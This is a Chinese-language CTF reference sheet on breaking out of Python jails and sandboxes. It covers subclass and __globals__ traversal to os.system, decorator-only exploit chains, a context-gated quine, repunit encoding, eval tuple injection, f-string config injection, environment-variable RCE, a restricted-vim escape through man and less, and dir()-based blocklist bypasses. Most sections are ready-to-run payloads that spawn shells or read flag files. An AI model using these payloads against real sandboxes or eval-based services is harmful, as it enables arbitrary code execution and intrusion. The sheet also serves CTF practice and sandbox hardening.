# CTF Misc - Python Jails

## 目录
- [识别 Jail 类型](#identifying-jail-type)
- [系统化枚举](#systematic-enumeration)
  - [测试基本功能](#test-basic-features)
  - [测试被阻止的 AST 节点](#test-blocked-ast-nodes)
  - [暴力破解函数名](#brute-force-function-names)
- [基于 Oracle 的挑战](#oracle-based-challenges)
  - [二分查找](#binary-search)
  - [线性查找](#linear-search)
- [不使用连接构建字符串](#building-strings-without-concat)
- [经典逃逸技巧](#classic-escape-techniques)
  - [通过类继承层次](#via-class-hierarchy)
  - [编译绕过](#compile-bypass)
  - [Unicode 绕过](#unicode-bypass)
  - [getattr 替代方案](#getattr-alternatives)
- [Walrus 操作符重新赋值](#walrus-operator-reassignment)
  - [八进制转义](#octal-escapes)
- [魔法注释逃逸](#magic-comment-escape)
- [Mastermind 风格 Jail](#mastermind-style-jails)
  - [寻找输入长度](#find-input-length)
  - [寻找字符](#find-characters)
  - [寻找位置](#find-positions)
- [服务器通信](#server-communication)
- [魔法文件 ReDoS](#magic-file-redos)
- [环境变量 RCE](#environment-variable-rce)
- [func_globals 到模块链遍历（PlaidCTF 2013）](#func_globals-to-module-chain-traversal-plaidctf-2013)
- [受限字符集数字生成（PlaidCTF 2013）](#restricted-charset-number-generation-plaidctf-2013)
- [带类属性持久化的多阶段 Payload（PlaidCTF 2013）](#multi-stage-payload-with-class-attribute-persistence-plaidctf-2013)
- [dir() 属性查找逃逸绕过 __class__ 黑名单（InCTF 2018）](#dir-attribute-lookup-escape-bypassing-__class__-blocklist-inctf-2018)
- [通过 K (man) 到 :!sh 的受限 vim 逃逸（TokyoWesterns CTF 4th 2018）](#restricted-vim-escape-via-k-man-to-sh-tokyowesterns-ctf-4th-2018)
- [Python 名字重整和属性访问（Tokyo Westerns 2017）](#python-name-mangling-and-attribute-access-tokyo-westerns-2017)
- [基于装饰器的逃逸（无调用，无引号，无等号）](#decorator-based-escape-no-call-no-quotes-no-equals)
  - [技巧 1：`function.__name__` 作为字符串键](#technique-1-function__name__-as-string-keys)
  - [技巧 2：通过 getset_descriptor 提取名称](#technique-2-name-extractor-via-getset_descriptor)
  - [技巧 3：通过 \_\_loader\_\_ 访问真实内置](#technique-3-accessing-real-builtins-via-__loader__)
  - [完整利用链](#full-exploit-chain)
  - [装饰器链的工作原理（自底向上）](#how-the-decorator-chain-works-bottom-up)
  - [变体](#variations)
  - [该技巧的约束清单](#constraints-checklist-for-this-technique)
  - [当 \_\_loader\_\_ 不可用时](#when-__loader__-is-not-available)
- [Quine + 上下文检测实现代码执行（BearCatCTF 2026）](#quine--context-detection-for-code-execution-bearcatctf-2026)
- [受限字符重复数分解（BearCatCTF 2026）](#restricted-character-repunit-decomposition-bearcatctf-2026)
- [通过元组注入绕过 Python eval() Jail（Codegate 2018）](#python-eval-jail-escape-via-tuple-injection-codegate-2018)
- [通过存储的 eval 注入 Python f-string 配置（INShAck 2018）](#python-f-string-config-injection-via-stored-eval-inshack-2018)
- [提示备忘单](#hints-cheat-sheet)

---

## 识别 Jail 类型

**错误模式揭示过滤机制：**

| 错误模式 | 含义 | 处理方法 |
|----------|------|----------|
| `name not allowed: X` | 标识符黑名单 | Unicode，十六进制转义 |
| `unknown function: X` | 函数白名单 | 暴力破解函数名 |
| `node not allowed: X` | AST 过滤 | 避免被阻止的语法 |
| `binop types must be int/bool` | 类型限制 | 使用整数运算 |

---
## 系统化枚举

### 测试基本功能
```python
tests = [
    ("1+1", "算术"),
    ("True", "布尔值"),
    ("'hello'", "字符串字面量"),
    ("'\\x41'", "十六进制转义"),
    ("1==1", "比较"),
]
```

### 测试被阻止的 AST 节点
```python
blocked_tests = [
    ("'a'+'b'", "字符串拼接"),
    ("'ab'[0]", "索引"),
    ("''.join", "属性访问"),
    ("[1,2]", "列表"),
    ("lambda:1", "lambda 表达式"),
]
```

### 暴力破解函数名
```python
import string
for c in string.printable:
    result = test(f"{c}(65)")
    if "unknown function" not in result:
        print(f"FOUND: {c}()")
```

---

## 基于 Oracle 的挑战

**常用函数：** `L()`, `Q(i, x)`, `S(guess)`
- `L()` = 秘密长度
- `Q(i, x)` = 比较位置 i 的值与 x
- `S(guess)` = 提交答案

### 二分查找
```python
def find_char(i):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        cmp = query(i, mid)
        if cmp == 0:
            return chr(mid)
        elif cmp == -1:  # mid < flag[i]
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag_len = int(test("L()"))
flag = ''.join(find_char(i) for i in range(flag_len))
```

### 线性查找
```python
for i in range(flag_len):
    for c in range(32, 127):
        if query(i, c) == 0:
            flag += chr(c)
            break
```

---

## 不使用拼接构造字符串

```python
# 十六进制转义
"'\\x66\\x6c\\x61\\x67'"  # => 'flag'

def to_hex_str(s):
    return "'" + ''.join(f'\\x{ord(c):02x}' for c in s) + "'"
```

---

## 经典绕过技巧

### 通过类继承层级
```python
''.__class__.__mro__[1].__subclasses__()
# 找到 <class 'os._wrap_close'>
```

### 编译绕过
```python
exec(compile('__import__("os").system("sh")', '', 'exec'))
```

### Unicode 绕过
```python
ｅｖａｌ = eval  # 全角字符
```

### getattr 替代方案
```python
"{0.__class__}".format('')
vars(''.__class__)
```

---

## Walrus 操作符重新赋值

```python
# 重新赋值约束变量
(abcdef := "all_allowed_letters")
```

### 八进制转义
```python
# \141 = 'a', \142 = 'b'，依此类推
all_letters = '\141\142\143...'
(abcdef := "{all_letters}")
print(open("/flag.txt").read())
```

---

## 魔法注释绕过

```python
# -*- coding: raw_unicode_escape -*-
\u0069\u006d\u0070\u006f\u0072\u0074 os
```

**有用的编码：**
- `utf-7`
- `raw_unicode_escape`
- `rot_13`

---

## Mastermind 风格的沙箱

**输出解释：**
```text
function("aaa...") => "1 0"  # 1 个存在但位置错误，0 个位置正确
```

### 找输入长度
```python
for length in range(1, 50):
    result = test('a' * length)
    print(f"len={length}: {result}")
```

### 找字符
```python
for c in charset:
    result = test(c * SECRET_LEN)
    if result[0] + result[1] > 0:
        print(f"{c}: count={result[0] + result[1]}")
```

### 找位置
```python
known = ""
for pos in range(SECRET_LEN):
    for c in candidate_chars:
        test_str = known + c + 'Z' * (SECRET_LEN - len(known) - 1)
        result = test(test_str)
        if result[1] > len(known):
            known += c
            break
```

---

## 服务器通信

```python
from pwn import *
context.log_level = 'error'

def test_with_delay(cmd, delay=5):
    r = remote('host', port, timeout=20)
    r.sendline(cmd.encode())
    import time
    time.sleep(delay)
    try:
        return r.recv(timeout=3).decode()
    except:
        return None
    finally:
        r.close()
```

---
## Magic File ReDoS

**恶意 magic 文件：**
```text
0 regex (a+)+$ Vulnerable pattern
```

**时间盲注 oracle：**
```python
def measure(payload):
    start = time.time()
    requests.post(URL, data={'magic': payload})
    return time.time() - start
```

---

## 环境变量 RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**其他危险变量：**
- `PYTHONSTARTUP` - 交互式启动时执行
- `PYTHONPATH` - 注入模块
- `PYTHONINSPECT` - 进入交互式 shell

---

## 基于装饰器的逃逸（无调用，无引号，无等号）

**模式（Ergastulum）：** 禁止 `ast.Call`，无引号，无 `=`，无逗号，字符集为 `a-z0-9()[]:._@\n`。执行上下文中 `__builtins__={}` 且 `__loader__=_frozen_importlib.BuiltinImporter`。

**关键洞察：** 装饰器绕过了 `ast.Call` —— `@expr` 应用于 `def name(): body` 会编译成 `name = expr(func)`，调用 `expr` 时没有 `ast.Call` 节点。这也提供了无 `=` 的赋值方式。

### 技巧 1：使用 `function.__name__` 作为字符串键

定义函数以创建匹配字典键的字符串：
```python
def __builtins__():   # __builtins__.__name__ == "__builtins__"
    0
def exec():           # exec.__name__ == "exec"
    0
```
用作字典下标：`some_dict[exec.__name__]` 访问 `some_dict["exec"]`。

### 技巧 2：通过 getset_descriptor 提取名称

`function_type.__dict__['__name__'].__get__` 接受一个函数并返回其 `.__name__` 字符串。这允许链式装饰器：

```python
@dict_obj.__getitem__        # 第 2 步：dict["key_name"] → value
@func.__class__.__dict__[__name__.__name__].__get__  # 第 1 步：提取 .__name__
def key_name():              # 函数名为 "key_name"
    0
# 结果：key_name = dict_obj["key_name"]
```

### 技巧 3：通过 __loader__ 访问真实内置函数

```python
__loader__.load_module.__func__.__globals__["__builtins__"]
```
包含真实的 `exec`、`__import__`、`print`、`compile`、`chr`、`type`、`getattr`、`setattr` 等。

### 完整利用链

```python
# 第 1 步：定义辅助函数用于字符串键提取
def __builtins__():
    0
def __name__():
    0
def __import__():
    0

# 第 2 步：从 loader 的 globals 中提取真实的 __import__
# 等价于：__import__ = globals_dict["__builtins__"]["__import__"]
@__loader__.load_module.__func__.__globals__[__builtins__.__name__].__getitem__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def __import__():
    0

# 第 3 步：导入 os 模块
# 等价于：os = __import__("os")
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def os():
    0

# 第 4 步：获取 shell
# 等价于：sh = os.system("sh")
@os.system
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def sh():
    0
```

### 装饰器链的工作原理（自下而上）

```python
@outer_func
@inner_func
def name():
    0
```
执行为：`name = outer_func(inner_func(function_named_name))`

对于 `__import__` 的提取：
1. `__builtins__.__class__` → `<class 'function'>`（我们定义函数的类型）
2. `.__dict__[__name__.__name__]` → `function.__dict__["__name__"]` → getset_descriptor
3. `.__get__` → 描述符的 getter（接受函数，返回其 `.__name__` 字符串）
4. 应用于 `def __import__(): 0` → 返回字符串 `"__import__"`
5. `globals_dict["__builtins__"].__getitem__("__import__")` → 真实的 `__import__` 函数

### 变体

**通过 exec + 代码对象执行任意代码：**
```python
def __code__():
    0
@exec_function
@__builtins__.__class__.__dict__[__code__.__name__].__get__
def payload():
    ... # 待执行代码（仍受字符集/AST 限制）
```

**按名称导入任意模块：**
```python
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def subprocess():  # 或任何使用允许字符的有效模块名
    0
```
### 该技术的约束清单

- [x] 不含 `ast.Call` 节点（装饰器是带有 decorator_list 的 `ast.FunctionDef`）
- [x] 不含引号（字符串来自 `function.__name__`）
- [x] 不含 `=` 符号（装饰器提供赋值）
- [x] 不含逗号（单参数装饰器调用）
- [x] 不含 `+`、`*` 等运算符（纯属性/下标链）
- [x] 适用于空的 `__builtins__`（通过 `__loader__` 访问真实内置）

### 当 __loader__ 不可用时

如果作用域中没有 `__loader__`，但你有任意函数对象 `f`：
- `f.__class__` → 函数类型
- `f.__globals__` → 定义 `f` 的模块全局变量
- `f.__globals__["__builtins__"]` → 真实内置（如果 `f` 来自普通模块）

如果你有一个类 `C`：
- `C.__init__.__globals__` → 定义 `C` 的模块全局变量

**参考：** 0xL4ugh CTF 2025 “Ergastulum”（442分，精英组），GCTF 2022 “Treebox”

---

## Quine + 上下文检测实现代码执行（BearCatCTF 2026）

**模式（The Boy 是 Quine）：** 服务器要求提交一个 quine（打印自身源码的程序），通过子进程运行验证，然后在主进程用不同的 globals 执行 `exec()`。

**利用方法：** 构造一个双重用途的 quine：
1. 打印自身（通过子进程的 quine 验证）
2. 仅在服务器进程执行 payload（通过 globals 差异检测）

```python
# 上下文门控："subprocess" 模块存在于服务器 globals 中，但不存在于子进程
s='s=%r;print(s%%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0';print(s%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0
```

**关键洞察：** 服务器进程中的 `exec()` 继承了服务器的 globals（导入的模块如 `subprocess`），而子进程验证环境干净。利用 `"module_name" in globals()` 或 `"module_name" in dir()` 作为门控区分上下文。quine 结构 `s='s=%r;...';print(s%s,end="")` 是经典 Python quine 模式。

---

## 限制字符的重复数字分解（BearCatCTF 2026）

**模式（The Brig）：** 选用恰好 2 个字符构造整个表达式。服务器执行 `eval(long_to_bytes(eval(expr)))` —— 外层 eval 运行解码后的 Python 代码。

**策略：** 选择 `1` 和 `+`。将目标整数分解为重复数字的和（111、1111、11111 等）：
```python
from Crypto.Util.number import bytes_to_long

target = bytes_to_long(b'eval(input())')  # → 13 字节整数

def repunit(k):
    return (10**k - 1) // 9  # k 位的 111...1

terms = []
remaining = target
while remaining > 0:
    k = 1
    while repunit(k + 1) <= remaining:
        k += 1
    terms.append('1' * k)
    remaining -= repunit(k)

expr = '+'.join(terms)  # 例如 "111...1+111...1+11+1+1"
# expr 长度约 2561 字符（符合 4096 限制）
```

**关键洞察：** 任意正整数都能写成重复数字的和（如 1、11、111 等）。贪心算法产生约 O(log²(n)) 个项。该方法将 2 字符限制转为通过 `long_to_bytes()` 执行任意代码。在第二个无限制提示符下，运行 `open('/flag.txt').read()`。

**检测点：** 挑战限制输入字符集恰好为 2 个字符。双重 eval 模式（`eval(decode(eval(...)))`）。

---

## 通过元组注入绕过 Python eval() 沙箱（Codegate 2018）

当服务器执行 `eval("your." + input + "()")` 时，注入元组以执行任意代码：

```python
# 服务器代码：eval("your." + user_input + "()")
# 注入：dig(),eval(eval('raw\x5finput()')),
# 变为：eval("your.dig(),eval(eval('raw\x5finput()')),()") 
# = (your.dig(), eval(任意代码), None) 的元组

# 另一种：通过注册时的 Name 变量注入 payload
# Name = "__import__('os').system('/bin/sh')"
# 输入：dig(),eval(name),exit
# eval("your.dig(),eval(name),exit()") -> 执行 name 中的 payload
```

**关键洞察：** Python `eval()` 对逗号分隔表达式返回元组，允许执行多个表达式。`\x5f` 十六进制转义绕过下划线黑名单。当直接注入代码被阻止时，将 payload 存入变量（注册名、环境变量），通过 `eval(varname)` 引用执行。通用模式：若服务器用 `eval("prefix" + input + "suffix")` 包裹输入，利用逗号打破原表达式，注入额外表达式作为元组元素。

---
## Python f-string 配置注入通过存储的 eval (INShAck 2018)

**模式：** 配置创建者使用 Python f-string 来渲染值。将 payload 作为一个配置值存储，然后通过另一个配置项使用 eval() 引用它。注册键 "a" 值为 `__import__("os").system("cat flag")`，然后注册键 "eval(a)" 值为 "{}"。

```python
# 第一步：将 payload 作为配置值存储
register_key("a", '__import__("os").system("cat flag.txt")')

# 第二步：创建键名为 eval(a) 且值为空格式占位符的键
register_key("eval(a)", "{}")

# 第三步：当配置渲染 f"eval(a) = {value}" 时，
# f-string 会在键位置计算 eval(a)，
# 执行存储的 payload
show_config()  # 触发 f-string 渲染 -> 远程代码执行
```

**关键洞察：** Python f-string 会在渲染时计算大括号内的表达式。如果配置的键或值在 f-string 中被渲染，存储 `eval(stored_key)` 作为键名会导致配置显示时执行任意代码。两步走：先将 payload 存为值，再通过 eval 在键名中引用。

---

## 提示备忘表

| 提示 | 含义 |
|------|---------|
| "I love chars" | 单字符函数 |
| "No words" | 多字符被屏蔽 |
| "Oracle" | 查询函数用于泄露 |
| "knight/chess" | 猜谜游戏 |

---

## func_globals 到模块链遍历 (PlaidCTF 2013)

**模式：** 通过已加载类的方法的 `func_globals` 字典访问 `os.system`，无需导入任何模块。

```python
# 第一步：在子类列表中找到 catch_warnings（通常索引为 49 或 59）
[x for x in ().__class__.__base__.__subclasses__()
    if x.__name__ == "catch_warnings"][0]

# 第二步：通过 __init__ 或 __repr__ 访问 func_globals
g = ().__class__.__base__.__subclasses__()[59].__init__.func_globals
# Python 2: .__init__.im_func.func_globals
# Python 3: .__init__.__globals__

# 第三步：遍历模块链：warnings → linecache → os
g["linecache"].__dict__["os"].system("cat /flag.txt")

# 一行写法：
().__class__.__base__.__subclasses__()[59].__init__.__globals__["linecache"].__dict__["os"].system("id")
```

**关键洞察：** `warnings.catch_warnings` 类几乎总是已加载。其 `__init__.__globals__` 包含对 `linecache` 的引用，而 `linecache` 导入了 `os`。此链条避免了直接的 `import` 语句。子类索引因 Python 版本不同而异——可用 `[(i,x.__name__) for i,x in enumerate(''.__class__.__mro__[1].__subclasses__())]` 枚举。

---

## 限制字符集数字生成 (PlaidCTF 2013)

**模式：** 当禁止数字字面量时，仅用 `~`（按位取反）、`<<`（左移）、`[]<[]`（False=0）和 `{}`<[]`（True=1）生成任意整数。

```python
def brainfuckize(nb):
    """仅用 ~, <<, <, [], {} 转换整数为表达式"""
    if nb == -2: return "~({}<[])"    # ~True = -2
    if nb == -1: return "~([]<[])"    # ~False = -1
    if nb == 0:  return "([]<[])"     # False = 0
    if nb == 1:  return "({}<[])"     # True = 1
    if nb % 2:   return f"~{brainfuckize(~nb)}"  # 奇数: ~(补码)
    return f"({brainfuckize(nb//2)}<<({{}}<[]))"   # 偶数: 半数 << 1

# brainfuckize(65) → "(~(~([]<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))"
# 然后用: "%c" % 65 → "A"
```

**关键洞察：** 结合 `"%c" % ascii_value` 逐字符构造任意字符串。绕过剥离所有字母数字字符但允许操作符和括号的沙箱。

---

## Python 名称重整和属性访问 (Tokyo Westerns 2017)

三种利用 Python 名称可见性模型的沙箱逃逸向量。

**1. 名称重整绕过：** Python 类中的“私有”`__method` 名称被存储为 `_ClassName__method`。它们可通过 `dir()` 和 `getattr()` 访问——不是真正私有。

```python
# 名称重整绕过
getattr(obj, dir(obj)[0])()  # 调用 _ClassName__method
```

**2. 函数常量泄露：** 函数体内所有字符串字面量存储在 `func_code.co_consts`（Python 2）或 `__code__.co_consts`（Python 3）中，外部可读。

```python
# func_code 局部变量泄露 (Python 2)
func.func_code.co_consts  # 显示函数内所有字符串字面量

# Python 3 等价写法
func.__code__.co_consts
```

**3. 模块文档字符串作为数据存储：** 模块级三引号字符串成为 `module.__doc__`，无需文件访问即可读取。

```python
# 模块文档字符串访问
import target_module
target_module.__doc__  # 读取模块级三引号字符串
```

**关键洞察：** Python 的 `__` 前缀是名称重整，不是真正私有——`dir(obj)` + `getattr()` 可绕过。`func_code.co_consts` 暴露函数内所有字面量常量。模块文档字符串始终可作为 `__doc__` 读取，无需文件访问。

---
## Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)

**模式：** 通过写入子类的类属性，在多次 jail 提交中存储中间代码片段。

```python
# 阶段 1：在子类上存储代码片段
().__class__.__base__.__subclasses__()[-2].payload = "import os; os.system('cat /flag.txt')"

# 阶段 2（下一次提交）：检索并执行
exec(().__class__.__base__.__subclasses__()[-2].payload)
```

**关键洞察：** 类属性在同一进程内的不同 `eval()`/`exec()` 调用之间是持久的。如果 jail 限制输入长度但允许多次提交，可以通过子类属性分割 payload 并跨提交存储。使用 `IncrementalDecoder` 或任何持久子类作为存储目标。

---

## 通过 K (man) 到 :!sh 的受限 vim 逃逸（TokyoWesterns CTF 4th 2018）

**模式（shrine）：** 沙箱启动了一个受限的 `vim`，禁用了 `:shell`/`:!` 并使用安全模式配置。命令模式的逃逸被阻止，但普通模式下的 `K`（通过 `keywordprg` 查找光标下的关键字，默认是 `man`）仍然可用。`man` 内部通过 `less` 分页，而 `less` 本身有文档化的 shell 逃逸：在分页器中输入 `!sh` 会以用户真实权限启动一个 shell。

**利用步骤：**
1. 在受限 vim 中打开任意文件（或用 `vim -c 'new' -c 'put! ="ls"'` 内联创建一个）。
2. 在普通模式下，将光标放在任意标识符上，按 `K`。vim 会执行 `man <word>`。
3. `man` 将输出通过管道传给 `less`。在 `less` 中，输入 `!sh` 并回车——分页器会 fork/exec 出一个真实 shell。
4. 或者，在 `less` 中输入 `v` 启动 `$EDITOR`；如果 `EDITOR=vim` 未设置，默认编辑器仍允许通过 `:!` 逃逸 shell。

```text
vim file.txt        # 受限 vim 打开
(光标在 "ls" 上)
K                   # 执行 `man ls` → 分页器 `less`
!sh                 # less shell 逃逸 → 真实 shell
```

**首先检查的加固信号：** `keywordprg` 的值（`:set keywordprg?`）、`secure` 模式、是否清除了 `shell` 选项，以及环境变量 `LESSSECURE=1`。`LESSSECURE=1` 会专门禁用 `less` 中的 `!`、`|`、`v` 和 `s`，缺失该变量则是逃逸的绿灯。

**关键洞察：** 受限编辑器几乎总是通过链式分页器和关键字查找泄露。列举所有会生成子进程的命令（`K`/`keywordprg`、`:grep`、`:make`、`gx` 打开 URL、`:Man`）再考虑 `:!`。只要有一个子进程使用了 `less` 或其他支持逃逸的分页器且没有 `LESSSECURE=1`，就能获得 shell。

**参考资料：** TokyoWesterns CTF 4th 2018 — writeup 10859；GTFOBins 中的 `vim`/`less`/`man` 条目

---

## 通过 dir() 属性查找绕过 __class__ 黑名单逃逸（InCTF 2018）

**模式：** 沙箱对字面字符串 `__class__`、`__bases__`、`__subclasses__`、`eval` 和 `import` 进行子串过滤，但允许使用 `dir(obj)` 并返回属性名字符串。利用 `dir([])` 按索引查找被禁止的属性名，再链式调用 `getattr`，无需输入被屏蔽的字面量即可访问 `object.__subclasses__()`。

```python
# 黑名单: "__class__", "__subclasses__", "eval", "import", "exec"
# 允许: dir(), getattr(), 列表字面量, 整数字面量

# 步骤 1：找出 "__class__" 在 dir([]) 中的索引
# dir([]) == ['__add__', '__class__', '__contains__', ...]
i_class = 1
base_attr = 34           # "__subclasses__" 在 dir(getattr([], dir([])[1])) 中的索引

# 步骤 2：用索引的 dir() 查找链式调用 getattr
cls       = getattr([],  dir([])[i_class])           # list.__class__
base      = getattr(cls, dir(cls)[dir(cls).index("__base__")])   # object
subs      = getattr(base, dir(base)[base_attr])()    # 所有类的列表

# 步骤 3：找到有用的类 — 通常是 subprocess.Popen
for klass in subs:
    if "Popen" in getattr(klass, dir(klass)[dir(klass).index("__name__")]):
        break
klass(["/bin/sh", "-c", "cat flag"])
```

**关键洞察：** `dir()` 是一个*数据*函数：它返回普通字符串。子串黑名单扫描源代码时看不到被屏蔽的字面量，因为它们是运行时从属性表字节生成的。任何只过滤源文本而不做 AST 解析的 Python jail 都会被一层间接绕过——`dir`、`globals().get(key)` 或 `vars(obj)[key]`。审计 jail 时，务必问：“过滤器看到的是字面量还是*值*？”如果只看到字面量，`dir()` 索引是最短的逃逸路径。

**参考资料：** InCTF 2018 — The Most Secure File Uploader，writeup 11528
